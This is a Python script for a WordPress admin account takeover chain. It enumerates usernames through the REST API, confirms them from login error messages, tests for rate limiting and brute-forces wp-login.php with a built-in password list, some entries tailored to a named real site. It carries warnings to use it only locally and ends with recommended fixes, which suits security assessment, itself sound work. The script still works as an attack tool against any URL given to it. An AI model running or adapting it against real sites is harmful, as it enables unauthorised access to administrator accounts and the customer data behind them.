#!/usr/bin/env python3
"""
Attack Chain 1: Admin Account Takeover — Brute-Force Test Script

This script demonstrates the full Attack Chain 1 against a LOCAL WordPress
test environment. It replicates what an attacker would do against a WordPress
site with the same vulnerabilities found on www.starregistry.com:

  1. Enumerate usernames via REST API
  2. Confirm valid usernames via login error messages
  3. Brute-force passwords using a dictionary

IMPORTANT: Only run this against YOUR OWN local test environment.
           Never run this against sites you don't own.

Usage:
    python3 bruteforce_test.py --url http://localhost:8080
    python3 bruteforce_test.py --url http://localhost:8080 --wordlist custom_passwords.txt
    python3 bruteforce_test.py --url http://localhost:8080 --username admin
"""

import argparse
import sys
import time
import requests
from urllib.parse import urljoin

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Default password list (common weak passwords — for testing purposes)
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "admin123", "password123",
    "wordpress", "letmein", "welcome", "monkey", "dragon",
    "master", "login", "abc123", "qwerty", "trustno1",
    "iloveyou", "starregistry", "star123", "admin2026",
    "P@ssw0rd", "changeme", "test", "test123", "root",
    "toor", "pass", "1234", "12345", "123456789",
    "password1", "1password", "administrator", "admin1",
    "manager", "supervisor", "welcome1", "hello123",
    "sunshine", "princess", "football", "shadow",
    "michael", "jennifer", "hunter2", "batman",
    "access", "mustang", "121212", "696969",
    "passw0rd", "starAdmin", "Star123!", "registry",
]


def banner():
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║         ATTACK CHAIN 1: ADMIN ACCOUNT TAKEOVER TEST        ║
║                                                            ║
║  Demonstrates brute-force vulnerability against WordPress  ║
║  with misconfigured login security (no rate limiting,      ║
║  verbose errors, exposed usernames via REST API)           ║
║                                                            ║
║  ⚠  FOR AUTHORIZED LOCAL TESTING ONLY                      ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def phase1_enumerate_users(base_url):
    """Phase 1: Enumerate usernames via WP REST API"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 1: USERNAME ENUMERATION VIA REST API ═══{RESET}\n")

    users_url = urljoin(base_url, "/wp-json/wp/v2/users")
    print(f"  Target: {users_url}")

    try:
        resp = requests.get(users_url, timeout=10)
        if resp.status_code == 200:
            users = resp.json()
            if isinstance(users, list) and len(users) > 0:
                print(f"\n  {GREEN}[SUCCESS]{RESET} Found {len(users)} user(s):\n")
                usernames = []
                for u in users:
                    uid = u.get("id", "?")
                    name = u.get("name", "?")
                    slug = u.get("slug", "?")
                    role_hint = "LIKELY ADMIN" if uid == 1 else "Staff"
                    color = RED if uid == 1 else YELLOW
                    print(f"    {color}ID: {uid:<5} Username: {slug:<20} Name: {name:<25} [{role_hint}]{RESET}")
                    usernames.append(slug)
                return usernames
            else:
                print(f"  {YELLOW}[INFO]{RESET} API returned empty or non-list response")
                return []
        elif resp.status_code == 401 or resp.status_code == 403:
            print(f"  {GREEN}[SECURED]{RESET} REST API user enumeration is BLOCKED (HTTP {resp.status_code})")
            print(f"  This site is protected against Phase 1 of Attack Chain 1.")
            return []
        else:
            print(f"  {YELLOW}[INFO]{RESET} Unexpected response: HTTP {resp.status_code}")
            return []
    except requests.RequestException as e:
        print(f"  {RED}[ERROR]{RESET} Could not connect: {e}")
        return []


def phase2_confirm_username(base_url, username):
    """Phase 2: Confirm username validity via login error messages"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 2: USERNAME CONFIRMATION VIA LOGIN ERRORS ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    print(f"  Target: {login_url}")
    print(f"  Testing username: {username}\n")

    try:
        # First GET the login page to collect cookies (WordPress requires testcookie)
        session = requests.Session()
        session.get(login_url, timeout=10)

        # Test with the target username
        resp = session.post(login_url, data={
            "log": username,
            "pwd": "definitely_wrong_password_12345",
            "wp-submit": "Log In",
            "redirect_to": urljoin(base_url, "/wp-admin/"),
            "testcookie": "1"
        }, allow_redirects=True, timeout=10)

        body = resp.text

        if "incorrect" in body.lower() and username.lower() in body.lower():
            print(f"  {RED}[VULNERABLE]{RESET} Server confirms username EXISTS:")
            print(f'  Error: "The password you entered for the username {username} is incorrect."')
            print(f"\n  {YELLOW}This means an attacker knows this is a VALID account to brute-force.{RESET}")
            return True
        elif "not registered" in body.lower() or "invalid username" in body.lower():
            print(f"  {GREEN}[SAFE]{RESET} Server says username does NOT exist.")
            return False
        elif "invalid username or password" in body.lower():
            print(f"  {GREEN}[SECURED]{RESET} Server uses GENERIC error message.")
            print(f"  Attacker cannot determine if username is valid.")
            return False
        elif "cookies" in body.lower() and "blocked" in body.lower():
            print(f"  {YELLOW}[RETRY]{RESET} Cookie issue, retrying with fresh session...")
            # Some WP setups need the cookie from the GET before POST works
            session2 = requests.Session()
            session2.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
            resp2 = session2.post(login_url, data={
                "log": username,
                "pwd": "definitely_wrong_password_12345",
                "wp-submit": "Log In",
                "redirect_to": urljoin(base_url, "/wp-admin/"),
                "testcookie": "1"
            }, allow_redirects=True, timeout=10)
            body2 = resp2.text
            if "incorrect" in body2.lower() and username.lower() in body2.lower():
                print(f"  {RED}[VULNERABLE]{RESET} Server confirms username EXISTS:")
                print(f'  Error: "The password you entered for the username {username} is incorrect."')
                print(f"\n  {YELLOW}This means an attacker knows this is a VALID account to brute-force.{RESET}")
                return True
            elif "not registered" in body2.lower() or "invalid username" in body2.lower():
                print(f"  {GREEN}[SAFE]{RESET} Server says username does NOT exist.")
                return False
            else:
                print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern after retry.")
                return True  # Assume vulnerable if uncertain
        else:
            print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern.")
            print(f"  Response snippet: {body[body.find('login_error'):body.find('login_error')+200] if 'login_error' in body else 'N/A'}")
            return True  # Assume vulnerable if uncertain

    except requests.RequestException as e:
        print(f"  {RED}[ERROR]{RESET} Could not connect: {e}")
        return False


def phase3_check_rate_limiting(base_url, username):
    """Phase 2.5: Check if rate limiting exists"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 2.5: RATE LIMITING CHECK ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    print(f"  Sending 10 rapid login attempts...")

    blocked = False
    times = []

    for i in range(1, 11):
        start = time.time()
        try:
            resp = requests.post(login_url, data={
                "log": username,
                "pwd": f"wrong_password_{i}",
                "wp-submit": "Log In",
            }, allow_redirects=True, timeout=10)
            elapsed = (time.time() - start) * 1000
            times.append(elapsed)

            if resp.status_code == 429:
                print(f"  Attempt {i:>2}: {GREEN}HTTP 429 — RATE LIMITED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            elif resp.status_code == 403:
                print(f"  Attempt {i:>2}: {GREEN}HTTP 403 — BLOCKED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            elif "too many" in resp.text.lower() or "locked" in resp.text.lower():
                print(f"  Attempt {i:>2}: {GREEN}HTTP {resp.status_code} — LOCKOUT DETECTED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            else:
                print(f"  Attempt {i:>2}: HTTP {resp.status_code} ({elapsed:.0f}ms)")
        except requests.RequestException as e:
            print(f"  Attempt {i:>2}: {RED}ERROR — {e}{RESET}")
            blocked = True
            break

    if blocked:
        print(f"\n  {GREEN}[SECURED]{RESET} Rate limiting or lockout detected.")
        print(f"  Brute-force attack would be slowed or blocked.")
        return False
    else:
        avg_time = sum(times) / len(times)
        print(f"\n  {RED}[VULNERABLE]{RESET} No rate limiting detected!")
        print(f"  Average response time: {avg_time:.0f}ms")
        print(f"  At this rate: ~{int(3600000/avg_time):,} attempts/hour possible")
        return True


def phase3_bruteforce(base_url, username, passwords):
    """Phase 3: Dictionary brute-force attack"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 3: PASSWORD BRUTE-FORCE ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    print(f"  Target:    {login_url}")
    print(f"  Username:  {username}")
    print(f"  Wordlist:  {len(passwords)} passwords")
    print(f"  Method:    POST to wp-login.php")
    print()

    found = False
    start_time = time.time()

    # Use a session to maintain cookies (required by WordPress)
    session = requests.Session()
    session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
    # Warm up the session with a GET to collect any server-set cookies
    try:
        session.get(login_url, timeout=10)
    except requests.RequestException:
        pass

    for i, password in enumerate(passwords, 1):
        try:
            resp = session.post(login_url, data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": urljoin(base_url, "/wp-admin/"),
                "testcookie": "1"
            }, allow_redirects=False, timeout=15)

            # WordPress redirects to wp-admin on successful login (302)
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "wp-admin" in location:
                    elapsed = time.time() - start_time
                    print(f"\r  [{i:>4}/{len(passwords)}] Trying: {password:<30}", end="")
                    print(f"\n\n  {RED}{BOLD}╔════════════════════════════════════════════╗{RESET}")
                    print(f"  {RED}{BOLD}║  PASSWORD FOUND!                           ║{RESET}")
                    print(f"  {RED}{BOLD}║                                            ║{RESET}")
                    print(f"  {RED}{BOLD}║  Username: {username:<30} ║{RESET}")
                    print(f"  {RED}{BOLD}║  Password: {password:<30} ║{RESET}")
                    print(f"  {RED}{BOLD}║  Attempts: {i:<30} ║{RESET}")
                    print(f"  {RED}{BOLD}║  Time:     {elapsed:.1f}s{' '*(28-len(f'{elapsed:.1f}s'))} ║{RESET}")
                    print(f"  {RED}{BOLD}╚════════════════════════════════════════════╝{RESET}")
                    print(f"\n  {RED}ATTACK CHAIN 1 COMPLETE — Full admin access achieved.{RESET}")
                    print(f"  An attacker could now:")
                    print(f"    - Install malicious plugins (remote code execution)")
                    print(f"    - Export all customer data")
                    print(f"    - Inject credit card skimmers")
                    print(f"    - Deface the website")
                    print(f"    - Create backdoor accounts")
                    found = True
                    break

            # Rate limited or blocked
            elif resp.status_code == 429 or resp.status_code == 403:
                print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting kicked in at attempt {i}")
                print(f"  The brute-force attack was stopped by security controls.")
                break

            # Normal failed login (200 with error)
            else:
                print(f"\r  [{i:>4}/{len(passwords)}] Trying: {password:<30}", end="")
                sys.stdout.flush()

        except requests.RequestException as e:
            print(f"\n  {RED}[ERROR]{RESET} Request failed: {e}")
            break

    elapsed = time.time() - start_time

    if not found:
        print(f"\n\n  {GREEN}[NOT CRACKED]{RESET} Password not found in wordlist ({len(passwords)} attempts)")
        print(f"  Time elapsed: {elapsed:.1f}s")
        print(f"\n  {YELLOW}NOTE: This doesn't mean the site is secure!{RESET}")
        print(f"  A real attacker would use much larger wordlists:")
        print(f"    - rockyou.txt: 14,344,392 passwords")
        print(f"    - SecLists:    millions of passwords")
        print(f"    - Custom targeted wordlist for your business")
        print(f"\n  The VULNERABILITY still exists (no rate limiting).")
        print(f"  The password just wasn't in this small test wordlist.")

    return found


def print_summary(user_enum, user_confirmed, no_rate_limit, password_found):
    """Print final summary"""
    print(f"\n\n{BOLD}{'='*62}{RESET}")
    print(f"{BOLD}  ATTACK CHAIN 1 — VULNERABILITY SUMMARY{RESET}")
    print(f"{BOLD}{'='*62}{RESET}\n")

    checks = [
        ("REST API User Enumeration", user_enum,
         "Usernames exposed via /wp-json/wp/v2/users",
         "REST API user endpoint is blocked"),
        ("Login Error Username Confirmation", user_confirmed,
         "Error messages reveal valid/invalid usernames",
         "Generic error messages used"),
        ("No Rate Limiting on Login", no_rate_limit,
         "Unlimited login attempts allowed",
         "Rate limiting or lockout active"),
        ("Password Cracked via Brute-Force", password_found,
         "Admin password found in dictionary",
         "Password not in test wordlist (may still be weak)"),
    ]

    vulns = 0
    for name, is_vuln, vuln_msg, safe_msg in checks:
        if is_vuln:
            print(f"  {RED}[VULNERABLE]{RESET} {name}")
            print(f"             {vuln_msg}")
            vulns += 1
        else:
            print(f"  {GREEN}[SECURED]   {RESET} {name}")
            print(f"             {safe_msg}")
        print()

    print(f"  {BOLD}Result: {vulns}/4 vulnerabilities confirmed{RESET}")
    if vulns >= 3:
        print(f"\n  {RED}{BOLD}CRITICAL: Attack Chain 1 is viable against this configuration.{RESET}")
        print(f"  {RED}Your production site shares these same vulnerabilities.{RESET}")
    elif vulns >= 1:
        print(f"\n  {YELLOW}{BOLD}WARNING: Partial vulnerability — some attack chain steps work.{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}GOOD: Attack Chain 1 is blocked at all stages.{RESET}")

    print(f"\n{BOLD}  Recommended Fixes:{RESET}")
    print(f"  1. Disable REST API user enumeration (functions.php filter)")
    print(f"  2. Genericize login error messages (login_errors filter)")
    print(f"  3. Add rate limiting/CAPTCHA to wp-login.php")
    print(f"  4. Enable 2FA for all admin accounts")
    print(f"  5. Use strong, unique passwords (20+ chars)")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Attack Chain 1: WordPress Admin Brute-Force Test",
        epilog="Only use against YOUR OWN local test environments."
    )
    parser.add_argument("--url", default="http://localhost:8080",
                        help="Target WordPress URL (default: http://localhost:8080)")
    parser.add_argument("--username", default=None,
                        help="Target username (default: auto-detect via REST API)")
    parser.add_argument("--wordlist", default=None,
                        help="Path to password wordlist file (one per line)")
    parser.add_argument("--skip-bruteforce", action="store_true",
                        help="Only run phases 1-2, skip actual brute-force")
    args = parser.parse_args()

    banner()

    base_url = args.url.rstrip("/")
    print(f"  Target: {base_url}")

    # Phase 1: Enumerate users
    usernames = phase1_enumerate_users(base_url)

    # Determine target username
    if args.username:
        target_user = args.username
    elif usernames:
        # Pick the admin (ID 1 user, usually first or identified)
        target_user = usernames[0]
        print(f"\n  {YELLOW}Auto-selected target: {target_user}{RESET}")
    else:
        print(f"\n  {YELLOW}No users found via API. Using 'admin' as default.{RESET}")
        target_user = "admin"

    # Phase 2: Confirm username
    user_confirmed = phase2_confirm_username(base_url, target_user)

    # Phase 2.5: Check rate limiting
    no_rate_limit = phase3_check_rate_limiting(base_url, target_user)

    # Phase 3: Brute-force (if requested)
    password_found = False
    if not args.skip_bruteforce:
        if args.wordlist:
            try:
                with open(args.wordlist, encoding="latin-1") as f:
                    passwords = [line.strip() for line in f if line.strip()]
                print(f"\n  Loaded {len(passwords)} passwords from {args.wordlist}")
            except FileNotFoundError:
                print(f"\n  {RED}[ERROR]{RESET} Wordlist not found: {args.wordlist}")
                passwords = DEFAULT_PASSWORDS
        else:
            passwords = DEFAULT_PASSWORDS

        password_found = phase3_bruteforce(base_url, target_user, passwords)
    else:
        print(f"\n  {YELLOW}[SKIPPED]{RESET} Brute-force phase skipped (--skip-bruteforce)")

    # Summary
    user_enum = len(usernames) > 0
    print_summary(user_enum, user_confirmed, no_rate_limit, password_found)


if __name__ == "__main__":
    main()
